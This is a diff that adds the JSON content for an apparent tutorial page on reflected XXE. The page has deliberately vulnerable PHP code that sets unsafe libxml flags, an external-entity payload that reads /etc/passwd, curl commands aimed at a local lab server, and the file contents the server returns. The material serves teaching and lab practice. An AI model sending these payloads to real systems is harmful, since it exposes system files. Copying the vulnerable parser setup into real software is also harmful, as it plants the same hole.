@@ -1,0 +1,142 @@
+[
+    {
+    "id": "download-xxe-lab",
+    "type": "download",
+    "title": "XXE Practice Lab",
+    "text": "Download the vulnerable PHP lab and payload collection.",
+    "fileName": "xxe-lab.zip",
+    "url": "/downloads/xxe-lab.zip",
+    "size": "4kb"
+  },
+  {
+    "type": "section_heading",
+    "id": "reflected-xxe-intro",
+    "text": "What is Reflected XXE?"
+  },
+  {
+    "type": "order_block",
+    "id": "definition",
+    "text": "Reflected XXE occurs when a server parses attacker-controlled XML input and reflects expanded external entity content directly in the HTTP response."
+  },
+  {
+    "type": "section_heading",
+    "id": "vulnerable-code",
+    "text": "Vulnerable PHP Code"
+  },
+  {
+    "type": "code_block",
+    "id": "php-code",
+    "language": "php",
+    "code": "<?php\n$xml = file_get_contents(\"php://input\");\n\n$dom = new DOMDocument();\n$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);\n\necho $dom->saveXML();\n?>"
+  },
+  {
+    "type": "order_block",
+    "id": "flag-explanation",
+    "text": "<highlight>LIBXML_DTDLOAD</highlight> allows DOCTYPE processing. <highlight>LIBXML_NOENT</highlight> forces entity expansion. Without both, reflected XXE would not work."
+  },
+  {
+    "type": "section_heading",
+    "id": "step-1-confirm-xml",
+    "text": "Step 1 - Confirm XML Parsing"
+  },
+  {
+    "type": "code_block",
+    "id": "basic-test",
+    "language": "bash",
+    "code": "curl -X POST http://127.0.0.1:8000 -d '<?xml version=\"1.0\"?><data>Hello</data>'"
+  },
+  {
+    "type": "output_block",
+    "id": "basic-output",
+    "language": "xml",
+    "code": "<?xml version=\"1.0\"?>\n<data>Hello</data>"
+  },
+  {
+    "type": "order_block",
+    "id": "analysis-basic",
+    "text": "The server reflects the XML, confirming that user-supplied input is parsed and returned."
+  },
+  {
+    "type": "section_heading",
+    "id": "step-2-create-entity",
+    "text": "Step 2 - Define External Entity"
+  },
+  {
+    "type": "code_block",
+    "id": "xxe-payload",
+    "language": "xml",
+    "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data>&xxe;</data>"
+  },
+  {
+    "type": "section_heading",
+    "id": "step-3-send-payload",
+    "text": "Step 3 - Send Malicious XML"
+  },
+  {
+    "type": "code_block",
+    "id": "send-payload",
+    "language": "bash",
+    "code": "curl -X POST http://127.0.0.1:8000 -d @payload.xml"
+  },
+  {
+    "type": "section_heading",
+    "id": "step-4-observe-reflection",
+    "text": "Step 4 - Observe Reflected File Content"
+  },
+  {
+    "type": "output_block",
+    "id": "passwd-output",
+    "language": "text",
+    "code": "root:x:0:0:root:/root:/usr/bin/zsh\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n..."
+  },
+  {
+    "type": "order_block",
+    "id": "analysis-reflection",
+    "text": "The entity &xxe; is expanded by the XML parser, causing the contents of /etc/passwd to be injected into the XML response and reflected back to the attacker."
+  },
+  {
+    "type": "section_heading",
+    "id": "execution-mechanism",
+    "text": "Execution Flow"
+  },
+  {
+    "type": "explanation",
+    "id": "mechanism",
+    "title": "How Reflected XXE Executes",
+    "items": [
+      "User sends malicious XML with DOCTYPE.",
+      "Parser loads DTD (LIBXML_DTDLOAD).",
+      "Entity expansion is enabled (LIBXML_NOENT).",
+      "Parser encounters &xxe;.",
+      "SYSTEM resource is fetched.",
+      "Content replaces entity reference.",
+      "Application reflects processed XML."
+    ]
+  },
+  {
+    "type": "section_heading",
+    "id": "required-conditions",
+    "text": "Required Conditions"
+  },
+  {
+    "type": "explanation",
+    "id": "conditions",
+    "title": "Conditions for Reflected XXE",
+    "items": [
+      "Application must parse XML input.",
+      "DOCTYPE must be allowed.",
+      "Entity expansion must be enabled.",
+      "Response must reflect parsed XML to observe output."
+    ]
+  },
+  {
+    "type": "section_heading",
+    "id": "conclusion",
+    "text": "Conclusion"
+  },
+  {
+    "type": "order_block",
+    "id": "summary",
+    "text": "Reflected XXE allows attackers to read local files when XML parsing is misconfigured. The vulnerability exists because unsafe parser flags enable external entity expansion and the application reflects the processed output."
+  }
+]
